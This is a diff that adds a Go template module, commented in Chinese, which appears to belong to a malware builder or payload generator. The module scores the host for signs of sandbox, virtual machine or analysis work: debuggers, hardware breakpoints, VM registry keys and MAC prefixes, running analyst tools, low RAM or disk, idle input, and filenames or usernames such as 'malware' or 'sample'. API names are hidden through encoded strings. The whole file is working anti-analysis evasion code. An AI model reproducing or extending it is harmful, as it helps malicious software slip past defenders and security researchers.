@@ -1,0 +1,555 @@
+{{define "_sandbox"}}
+// ============================================================
+// 第3层：环境检测（加权评分制）
+// 每项检测返回 false 表示检测到沙箱特征。
+// 权重：高(3)=强信号，中(2)=中等信号，低(1)=弱信号。
+// 总分 ≥ sandboxThreshold 时判定为沙箱环境。
+// ============================================================
+
+type sandboxCheck struct {
+	weight int
+	check  func() bool
+}
+
+func antiSandboxChecks() bool {
+	defer func() { recover() }()
+
+	checks := []sandboxCheck{
+		// 高权重：强信号，误报率低
+		{3, checkDebugger},
+		{3, checkVMRegistry},
+		{3, checkAnalysisTools},
+		{3, checkHardwareBreakpoints},
+		// 中权重：中等信号
+		{2, checkCPUCores},
+		{2, checkRAMSize},
+		{2, checkDiskSize},
+		{2, checkMACAddress},
+		{2, checkUptime},
+		{2, checkSleepAcceleration},
+		// 低权重：弱信号，误报率较高
+		{1, checkUserActivity},
+		{1, checkProcessCount},
+		{1, checkScreenResolution},
+		{1, checkRecentFiles},
+		{1, checkInstalledPrograms},
+		{1, checkFileName},
+		{1, checkDefenderSandbox},
+		{1, checkParentProcess},
+	}
+
+	score := 0
+	for _, c := range checks {
+		if !c.check() {
+			score += c.weight
+		}
+		if score >= sandboxThreshold {
+			return false
+		}
+	}
+	return true
+}
+
+// --- 高权重检测 ---
+
+func checkDebugger() bool {
+	k32 := kernel32()
+
+	// IsDebuggerPresent
+	isDbg := getProcAddr(k32, ds("{{index .EncodedStrings "IsDebuggerPresent"}}"))
+	if isDbg != 0 {
+		ret, _, _ := syscall.Syscall(isDbg, 0, 0, 0, 0)
+		if ret != 0 {
+			return false
+		}
+	}
+
+	// CheckRemoteDebuggerPresent
+	checkRemote := getProcAddr(k32, ds("{{index .EncodedStrings "CheckRemoteDebuggerPresent"}}"))
+	getCurProc := getProcAddr(k32, ds("{{index .EncodedStrings "GetCurrentProcess"}}"))
+	if checkRemote != 0 && getCurProc != 0 {
+		hProc, _, _ := syscall.Syscall(getCurProc, 0, 0, 0, 0)
+		var attached int32
+		syscall.Syscall(checkRemote, 2, hProc, uintptr(unsafe.Pointer(&attached)), 0)
+		if attached != 0 {
+			return false
+		}
+	}
+
+	// NtGlobalFlag (PEB+0xBC on x64)
+	ntQIP := getProcAddr(ntdll(), ds("{{index .EncodedStrings "NtQueryInformationProcess"}}"))
+	if ntQIP != 0 && getCurProc != 0 {
+		hProc, _, _ := syscall.Syscall(getCurProc, 0, 0, 0, 0)
+		var pbi [6]uintptr
+		var retLen uint32
+		ret, _, _ := syscall.Syscall6(ntQIP, 5, hProc, 0,
+			uintptr(unsafe.Pointer(&pbi[0])), unsafe.Sizeof(pbi),
+			uintptr(unsafe.Pointer(&retLen)), 0)
+		if ret == 0 && pbi[1] != 0 {
+			ntGlobalFlag := *(*uint32)(unsafe.Pointer(pbi[1] + 0xBC))
+			if ntGlobalFlag&0x70 != 0 {
+				return false
+			}
+		}
+	}
+	return true
+}
+
+func checkVMRegistry() bool {
+	regOpenKeyEx := getProcAddr(advapi32(), ds("{{index .EncodedStrings "RegOpenKeyExA"}}"))
+	regCloseKey := getProcAddr(advapi32(), ds("{{index .EncodedStrings "RegCloseKey"}}"))
+	if regOpenKeyEx == 0 || regCloseKey == 0 {
+		return true
+	}
+	vmKeys := []string{
+		"SOFTWARE\\Oracle\\VirtualBox Guest Additions",
+		"SOFTWARE\\VMware, Inc.\\VMware Tools",
+	}
+	for _, key := range vmKeys {
+		var hKey uintptr
+		keyPtr, _ := syscall.BytePtrFromString(key)
+		ret, _, _ := syscall.Syscall6(regOpenKeyEx, 5,
+			0x80000002, uintptr(unsafe.Pointer(keyPtr)),
+			0, 0x20019, uintptr(unsafe.Pointer(&hKey)), 0)
+		if ret == 0 {
+			syscall.Syscall(regCloseKey, 1, hKey, 0, 0)
+			return false
+		}
+	}
+	return true
+}
+func checkAnalysisTools() bool {
+	k32 := kernel32()
+	snap := getProcAddr(k32, ds("{{index .EncodedStrings "CreateToolhelp32Snapshot"}}"))
+	first := getProcAddr(k32, ds("{{index .EncodedStrings "Process32FirstW"}}"))
+	next := getProcAddr(k32, ds("{{index .EncodedStrings "Process32NextW"}}"))
+	close := getProcAddr(k32, ds("{{index .EncodedStrings "CloseHandle"}}"))
+	if snap == 0 || first == 0 || next == 0 {
+		return true
+	}
+
+	badProcs := []string{
+		"ollydbg", "x64dbg", "x32dbg", "ida", "ida64",
+		"windbg", "processhacker", "procmon", "procexp",
+		"wireshark", "fiddler", "pestudio",
+		"vboxservice", "vboxtray", "vmwaretray", "vmwareuser",
+	}
+
+	hSnap, _, _ := syscall.Syscall(snap, 2, 0x2, 0, 0)
+	if hSnap == ^uintptr(0) {
+		return true
+	}
+	defer syscall.Syscall(close, 1, hSnap, 0, 0)
+
+	var pe PROCESSENTRY32W
+	pe.Size = uint32(unsafe.Sizeof(pe))
+	ret, _, _ := syscall.Syscall(first, 2, hSnap, uintptr(unsafe.Pointer(&pe)), 0)
+	if ret == 0 {
+		return true
+	}
+	for {
+		name := toLowerASCII(syscall.UTF16ToString(pe.ExeFile[:]))
+		for _, bad := range badProcs {
+			if containsSubstr(name, bad) {
+				return false
+			}
+		}
+		ret, _, _ = syscall.Syscall(next, 2, hSnap, uintptr(unsafe.Pointer(&pe)), 0)
+		if ret == 0 {
+			break
+		}
+	}
+	return true
+}
+
+func checkHardwareBreakpoints() bool {
+	k32 := kernel32()
+	getCurThread := getProcAddr(k32, ds("{{index .EncodedStrings "GetCurrentThread"}}"))
+	getCtx := getProcAddr(k32, ds("{{index .EncodedStrings "GetThreadContext"}}"))
+	if getCurThread == 0 || getCtx == 0 {
+		return true
+	}
+	hThread, _, _ := syscall.Syscall(getCurThread, 0, 0, 0, 0)
+	ctx := make([]byte, 1232)
+	*(*uint32)(unsafe.Pointer(&ctx[0x30])) = 0x10 // CONTEXT_DEBUG_REGISTERS
+	ret, _, _ := syscall.Syscall(getCtx, 2, hThread, uintptr(unsafe.Pointer(&ctx[0])), 0)
+	if ret != 0 {
+		dr0 := *(*uintptr)(unsafe.Pointer(&ctx[0x68]))
+		dr1 := *(*uintptr)(unsafe.Pointer(&ctx[0x70]))
+		dr2 := *(*uintptr)(unsafe.Pointer(&ctx[0x78]))
+		dr3 := *(*uintptr)(unsafe.Pointer(&ctx[0x80]))
+		if dr0 != 0 || dr1 != 0 || dr2 != 0 || dr3 != 0 {
+			return false
+		}
+	}
+	return true
+}
+
+// --- 中权重检测 ---
+
+func checkCPUCores() bool {
+	getInfo := getProcAddr(kernel32(), ds("{{index .EncodedStrings "GetSystemInfo"}}"))
+	if getInfo == 0 {
+		return true
+	}
+	var si SYSTEM_INFO
+	syscall.Syscall(getInfo, 1, uintptr(unsafe.Pointer(&si)), 0, 0)
+	return si.NumberOfProcessors >= 2
+}
+
+func checkRAMSize() bool {
+	gms := getProcAddr(kernel32(), ds("{{index .EncodedStrings "GlobalMemoryStatusEx"}}"))
+	if gms == 0 {
+		return true
+	}
+	var ms MEMORYSTATUSEX
+	ms.Length = uint32(unsafe.Sizeof(ms))
+	ret, _, _ := syscall.Syscall(gms, 1, uintptr(unsafe.Pointer(&ms)), 0, 0)
+	if ret == 0 {
+		return true
+	}
+	return ms.TotalPhys/(1024*1024*1024) >= 4
+}
+
+func checkDiskSize() bool {
+	gdf := getProcAddr(kernel32(), ds("{{index .EncodedStrings "GetDiskFreeSpaceExA"}}"))
+	if gdf == 0 {
+		return true
+	}
+	var free, total, totalFree uint64
+	p, _ := syscall.BytePtrFromString("C:\\")
+	ret, _, _ := syscall.Syscall6(gdf, 4,
+		uintptr(unsafe.Pointer(p)),
+		uintptr(unsafe.Pointer(&free)),
+		uintptr(unsafe.Pointer(&total)),
+		uintptr(unsafe.Pointer(&totalFree)), 0, 0)
+	if ret == 0 {
+		return true
+	}
+	return total >= 60*1024*1024*1024
+}
+
+func checkMACAddress() bool {
+	vmPrefixes := []string{
+		"00:05:69", "00:0C:29", "00:1C:14", "00:50:56",
+		"08:00:27", "0A:00:27",
+		"00:03:FF", "00:15:5D",
+		"00:1C:42",
+		"00:16:3E",
+	}
+	ifaces, err := net.Interfaces()
+	if err != nil {
+		return true
+	}
+	hex := "0123456789ABCDEF"
+	for _, iface := range ifaces {
+		hw := iface.HardwareAddr
+		if len(hw) < 3 {
+			continue
+		}
+		prefix := string([]byte{
+			hex[hw[0]>>4], hex[hw[0]&0xF], ':',
+			hex[hw[1]>>4], hex[hw[1]&0xF], ':',
+			hex[hw[2]>>4], hex[hw[2]&0xF],
+		})
+		for _, vp := range vmPrefixes {
+			if prefix == vp {
+				return false
+			}
+		}
+	}
+	return true
+}
+
+func checkUptime() bool {
+	gtc := getProcAddr(kernel32(), ds("{{index .EncodedStrings "GetTickCount64"}}"))
+	if gtc == 0 {
+		return true
+	}
+	ticks, _, _ := syscall.Syscall(gtc, 0, 0, 0, 0)
+	return ticks >= 600000
+}
+
+func checkSleepAcceleration() bool {
+	start := time.Now()
+	time.Sleep(500 * time.Millisecond)
+	return time.Since(start) >= 400*time.Millisecond
+}
+// --- 低权重检测 ---
+
+func checkUserActivity() bool {
+	u32 := user32()
+	getLastInput := getProcAddr(u32, ds("{{index .EncodedStrings "GetLastInputInfo"}}"))
+	gtc := getProcAddr(kernel32(), ds("{{index .EncodedStrings "GetTickCount"}}"))
+	if getLastInput == 0 || gtc == 0 {
+		return true
+	}
+	var lii LASTINPUTINFO
+	lii.CbSize = uint32(unsafe.Sizeof(lii))
+	ret, _, _ := syscall.Syscall(getLastInput, 1, uintptr(unsafe.Pointer(&lii)), 0, 0)
+	if ret == 0 {
+		return true
+	}
+	cur, _, _ := syscall.Syscall(gtc, 0, 0, 0, 0)
+	idle := uint32(cur) - lii.DwTime
+	return idle <= 300000
+}
+
+func checkProcessCount() bool {
+	k32 := kernel32()
+	snap := getProcAddr(k32, ds("{{index .EncodedStrings "CreateToolhelp32Snapshot"}}"))
+	first := getProcAddr(k32, ds("{{index .EncodedStrings "Process32FirstW"}}"))
+	next := getProcAddr(k32, ds("{{index .EncodedStrings "Process32NextW"}}"))
+	close := getProcAddr(k32, ds("{{index .EncodedStrings "CloseHandle"}}"))
+	if snap == 0 || first == 0 || next == 0 {
+		return true
+	}
+	hSnap, _, _ := syscall.Syscall(snap, 2, 0x2, 0, 0)
+	if hSnap == ^uintptr(0) {
+		return true
+	}
+	defer syscall.Syscall(close, 1, hSnap, 0, 0)
+
+	var pe PROCESSENTRY32W
+	pe.Size = uint32(unsafe.Sizeof(pe))
+	count := 0
+	ret, _, _ := syscall.Syscall(first, 2, hSnap, uintptr(unsafe.Pointer(&pe)), 0)
+	if ret == 0 {
+		return true
+	}
+	for {
+		count++
+		ret, _, _ = syscall.Syscall(next, 2, hSnap, uintptr(unsafe.Pointer(&pe)), 0)
+		if ret == 0 {
+			break
+		}
+	}
+	return count >= 30
+}
+
+func checkScreenResolution() bool {
+	gsm := getProcAddr(user32(), ds("{{index .EncodedStrings "GetSystemMetrics"}}"))
+	if gsm == 0 {
+		return true
+	}
+	w, _, _ := syscall.Syscall(gsm, 1, 0, 0, 0)
+	h, _, _ := syscall.Syscall(gsm, 1, 1, 0, 0)
+	return w >= 1024 && h >= 768
+}
+
+func checkRecentFiles() bool {
+	shGetFolder := getProcAddr(shell32(), ds("{{index .EncodedStrings "SHGetFolderPathA"}}"))
+	findFirst := getProcAddr(kernel32(), ds("{{index .EncodedStrings "FindFirstFileA"}}"))
+	findNext := getProcAddr(kernel32(), ds("{{index .EncodedStrings "FindNextFileA"}}"))
+	findClose := getProcAddr(kernel32(), ds("{{index .EncodedStrings "FindClose"}}"))
+	if shGetFolder == 0 || findFirst == 0 {
+		return true
+	}
+	var recentPath [260]byte
+	ret, _, _ := syscall.Syscall6(shGetFolder, 5, 0, 0x08, 0, 0, uintptr(unsafe.Pointer(&recentPath[0])), 0)
+	if ret != 0 {
+		return true
+	}
+	pathStr := ""
+	for _, b := range recentPath {
+		if b == 0 {
+			break
+		}
+		pathStr += string(b)
+	}
+	searchBytes, _ := syscall.BytePtrFromString(pathStr + "\\*")
+	findData := make([]byte, 592)
+	handle, _, _ := syscall.Syscall(findFirst, 2, uintptr(unsafe.Pointer(searchBytes)), uintptr(unsafe.Pointer(&findData[0])), 0)
+	if handle == ^uintptr(0) {
+		return false
+	}
+	defer syscall.Syscall(findClose, 1, handle, 0, 0)
+	count := 0
+	for {
+		count++
+		r, _, _ := syscall.Syscall(findNext, 2, handle, uintptr(unsafe.Pointer(&findData[0])), 0)
+		if r == 0 {
+			break
+		}
+	}
+	return count >= 5
+}
+
+func checkInstalledPrograms() bool {
+	findFirst := getProcAddr(kernel32(), ds("{{index .EncodedStrings "FindFirstFileA"}}"))
+	findNext := getProcAddr(kernel32(), ds("{{index .EncodedStrings "FindNextFileA"}}"))
+	findClose := getProcAddr(kernel32(), ds("{{index .EncodedStrings "FindClose"}}"))
+	if findFirst == 0 {
+		return true
+	}
+	searchBytes, _ := syscall.BytePtrFromString("C:\\Program Files\\*")
+	findData := make([]byte, 592)
+	handle, _, _ := syscall.Syscall(findFirst, 2, uintptr(unsafe.Pointer(searchBytes)), uintptr(unsafe.Pointer(&findData[0])), 0)
+	if handle == ^uintptr(0) {
+		return true
+	}
+	defer syscall.Syscall(findClose, 1, handle, 0, 0)
+	dirCount := 0
+	for {
+		attrs := *(*uint32)(unsafe.Pointer(&findData[0]))
+		if attrs&0x10 != 0 {
+			dirCount++
+		}
+		r, _, _ := syscall.Syscall(findNext, 2, handle, uintptr(unsafe.Pointer(&findData[0])), 0)
+		if r == 0 {
+			break
+		}
+	}
+	return dirCount >= 5
+}
+
+func checkFileName() bool {
+	getModFileName := getProcAddr(kernel32(), ds("{{index .EncodedStrings "GetModuleFileNameW"}}"))
+	if getModFileName == 0 {
+		return true
+	}
+	var buf [260]uint16
+	ret, _, _ := syscall.Syscall(getModFileName, 3, 0, uintptr(unsafe.Pointer(&buf[0])), 260)
+	if ret == 0 {
+		return true
+	}
+	name := toLowerASCII(syscall.UTF16ToString(buf[:]))
+	for i := len(name) - 1; i >= 0; i-- {
+		if name[i] == '\\' || name[i] == '/' {
+			name = name[i+1:]
+			break
+		}
+	}
+	suspicious := []string{"sample", "malware", "virus", "trojan", "sandbox", "payload", "dropper"}
+	for _, s := range suspicious {
+		if containsSubstr(name, s) {
+			return false
+		}
+	}
+	dotIdx := len(name)
+	for i, c := range name {
+		if c == '.' {
+			dotIdx = i
+			break
+		}
+	}
+	baseName := name[:dotIdx]
+	if len(baseName) >= 32 {
+		allHex := true
+		for _, c := range baseName {
+			if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f')) {
+				allHex = false
+				break
+			}
+		}
+		if allHex && (len(baseName) == 32 || len(baseName) == 64) {
+			return false
+		}
+	}
+	return true
+}
+
+func checkDefenderSandbox() bool {
+	getEnvW := getProcAddr(kernel32(), ds("{{index .EncodedStrings "GetEnvironmentVariableW"}}"))
+	if getEnvW != 0 {
+		envVars := []string{"CUCKOO", "SANDBOX", "MALWARE", "VIRUS", "SAMPLE"}
+		for _, env := range envVars {
+			envName := make([]uint16, len(env)+1)
+			for i, c := range env {
+				envName[i] = uint16(c)
+			}
+			var buf [256]uint16
+			ret, _, _ := syscall.Syscall(getEnvW, 3, uintptr(unsafe.Pointer(&envName[0])), uintptr(unsafe.Pointer(&buf[0])), 256)
+			if ret > 0 {
+				return false
+			}
+		}
+	}
+
+	getUserName := getProcAddr(advapi32(), ds("{{index .EncodedStrings "GetUserNameW"}}"))
+	if getUserName != 0 {
+		var buf [256]uint16
+		size := uint32(256)
+		ret, _, _ := syscall.Syscall(getUserName, 2, uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&size)), 0)
+		if ret != 0 {
+			name := toLowerASCII(syscall.UTF16ToString(buf[:]))
+			sandboxUsers := []string{"sandbox", "virus", "malware", "sample", "john doe", "currentuser"}
+			for _, su := range sandboxUsers {
+				if name == su {
+					return false
+				}
+			}
+		}
+	}
+
+	getCompName := getProcAddr(kernel32(), ds("{{index .EncodedStrings "GetComputerNameW"}}"))
+	if getCompName != 0 {
+		var buf [256]uint16
+		size := uint32(256)
+		ret, _, _ := syscall.Syscall(getCompName, 2, uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&size)), 0)
+		if ret != 0 {
+			name := toLowerASCII(syscall.UTF16ToString(buf[:]))
+			sandboxNames := []string{"sandbox", "virus", "malware", "analysis", "cuckoo"}
+			for _, sn := range sandboxNames {
+				if containsSubstr(name, sn) {
+					return false
+				}
+			}
+		}
+	}
+	return true
+}
+
+func checkParentProcess() bool {
+	ntQIP := getProcAddr(ntdll(), ds("{{index .EncodedStrings "NtQueryInformationProcess"}}"))
+	getCurProc := getProcAddr(kernel32(), ds("{{index .EncodedStrings "GetCurrentProcess"}}"))
+	if ntQIP == 0 || getCurProc == 0 {
+		return true
+	}
+	hProc, _, _ := syscall.Syscall(getCurProc, 0, 0, 0, 0)
+	var pbi [6]uintptr
+	var retLen uint32
+	ret, _, _ := syscall.Syscall6(ntQIP, 5, hProc, 0,
+		uintptr(unsafe.Pointer(&pbi[0])), unsafe.Sizeof(pbi),
+		uintptr(unsafe.Pointer(&retLen)), 0)
+	if ret != 0 || pbi[5] == 0 {
+		return true
+	}
+	parentPid := uint32(pbi[5])
+	openProc := getProcAddr(kernel32(), ds("{{index .EncodedStrings "OpenProcess"}}"))
+	closeH := getProcAddr(kernel32(), ds("{{index .EncodedStrings "CloseHandle"}}"))
+	if openProc == 0 || closeH == 0 {
+		return true
+	}
+	hParent, _, _ := syscall.Syscall(openProc, 3, 0x1000, 0, uintptr(parentPid))
+	if hParent == 0 {
+		return true
+	}
+	defer syscall.Syscall(closeH, 1, hParent, 0, 0)
+
+	queryName := getProcAddr(kernel32(), ds("{{index .EncodedStrings "QueryFullProcessImageNameW"}}"))
+	if queryName == 0 {
+		return true
+	}
+	var nameBuf [260]uint16
+	size := uint32(260)
+	ret, _, _ = syscall.Syscall6(queryName, 4, hParent, 0, uintptr(unsafe.Pointer(&nameBuf[0])), uintptr(unsafe.Pointer(&size)), 0, 0)
+	if ret == 0 {
+		return true
+	}
+	parentName := toLowerASCII(syscall.UTF16ToString(nameBuf[:]))
+	for i := len(parentName) - 1; i >= 0; i-- {
+		if parentName[i] == '\\' || parentName[i] == '/' {
+			parentName = parentName[i+1:]
+			break
+		}
+	}
+	dangerous := []string{"wscript.exe", "cscript.exe", "mshta.exe", "rundll32.exe", "regsvr32.exe"}
+	for _, d := range dangerous {
+		if parentName == d {
+			return false
+		}
+	}
+	return true
+}
+{{end}}
